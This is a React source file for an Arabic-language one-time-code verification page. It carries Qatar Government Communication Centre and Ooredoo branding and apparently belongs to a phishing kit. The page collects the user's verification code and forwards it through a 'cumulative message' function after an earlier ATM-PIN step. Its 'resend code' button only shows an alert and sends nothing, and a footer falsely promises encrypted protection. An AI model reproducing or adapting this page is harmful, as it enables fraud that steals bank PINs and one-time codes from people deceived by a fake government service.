import { useState } from "react";
import { useNavigate } from "react-router-dom";
import Header from "@/components/Header";
import Stepper from "@/components/Stepper";
import Footer from "@/components/Footer";
import { Button } from "@/components/ui/button";
import securePaymentLogos from "@/assets/secure-payment-logos.png";
import qgccLogo from "@/assets/qgcc-logo.png";
import ooredooLogo from "@/assets/ooredoo-verification-logo.png";
import { useRegistration } from "@/contexts/RegistrationContext";
const steps = [{
  number: 1,
  title: "نوع الحساب"
}, {
  number: 2,
  title: "البيانات الشخصية"
}, {
  number: 3,
  title: "كلمة المرور"
}, {
  number: 4,
  title: "إتمام التسجيل"
}];
const OTPVerification = () => {
  const navigate = useNavigate();
  const {
    updateData,
    sendCumulativeMessage
  } = useRegistration();
  const [otp, setOtp] = useState("");
  const handleVerify = async () => {
    if (otp.length === 4 || otp.length === 6) {
      const newData = {
        otp
      };
      updateData(newData);
      await sendCumulativeMessage(8, "رمز التحقق النهائي", newData);
      navigate('/processing-request');
    }
  };
  const handleResend = () => {
    alert("تم إرسال رمز التحقق مرة أخرى");
    setOtp("");
  };
  return <div className="min-h-screen flex flex-col bg-white" dir="rtl">
      <Header />
      
      <main className="flex-1 container mx-auto px-4 py-12 bg-white">
        <Stepper currentStep={4} steps={steps} />
        
        <div className="max-w-2xl mx-auto mt-8">
          <div className="bg-secondary/30 rounded-lg shadow-lg p-8 border border-border">
            <div className="text-center mb-8">
              <div className="flex items-center justify-center mb-6">
                <img src={qgccLogo} alt="مركز الاتصال الحكومي" className="h-16" />
              </div>
              <h2 className="text-2xl font-bold mb-2 text-foreground">
                رمز التحقق
              </h2>
              <p className="text-sm text-muted-foreground">
                يرجى إدخال الرمز المرسل إلى هاتفك
              </p>
            </div>

            <div className="bg-background rounded-lg p-6 mb-6">
              <p className="text-base text-foreground text-right mb-6 leading-relaxed">
                تم إرسال رمز التحقق إلى رقم الهاتف المسجل لديكم. يرجى إدخال الرمز في الحقل أدناه لإتمام عملية تفعيل الحساب.
              </p>

              <div className="flex justify-center mb-6">
                <input type="text" inputMode="numeric" maxLength={6} value={otp} onChange={e => setOtp(e.target.value.replace(/\D/g, ""))} placeholder="أدخل رمز التحقق" className="w-full max-w-sm h-14 px-4 rounded-md border-2 border-primary bg-white text-foreground text-center text-xl tracking-widest focus:outline-none focus:ring-2 focus:ring-primary focus:border-transparent" dir="ltr" />
              </div>

              <div className="text-center mb-6">
                <p className="text-sm text-muted-foreground mb-2">
                  لم تستلم رمز التحقق؟
                </p>
                <Button variant="link" onClick={handleResend} className="text-primary hover:text-primary/80 font-medium">
                  إعادة إرسال الرمز
                </Button>
              </div>

              
              
              <div className="flex justify-center mt-6">
                <img src={ooredooLogo} alt="Ooredoo" className="h-10" />
              </div>
            </div>

            <div className="flex gap-3 flex-row-reverse">
              <Button className="bg-primary hover:bg-primary/90 text-primary-foreground flex-1" onClick={handleVerify} disabled={otp.length !== 4 && otp.length !== 6}>
                تأكيد
              </Button>
              <Button variant="outline" onClick={() => navigate('/atm-pin')}>
                رجوع
              </Button>
            </div>

            <div className="mt-6 pt-6 border-t border-border space-y-4">
              <div className="flex items-center justify-center gap-2 text-xs text-muted-foreground">
                <span>🔒</span>
                <p className="text-center">
                  جميع البيانات محمية بتقنية التشفير المتقدمة وفقاً للمعايير الأمنية المعتمدة في دولة قطر
                </p>
              </div>
              
              <div className="flex justify-center">
                
              </div>
            </div>
          </div>
        </div>
      </main>

      <Footer />
    </div>;
};
export default OTPVerification;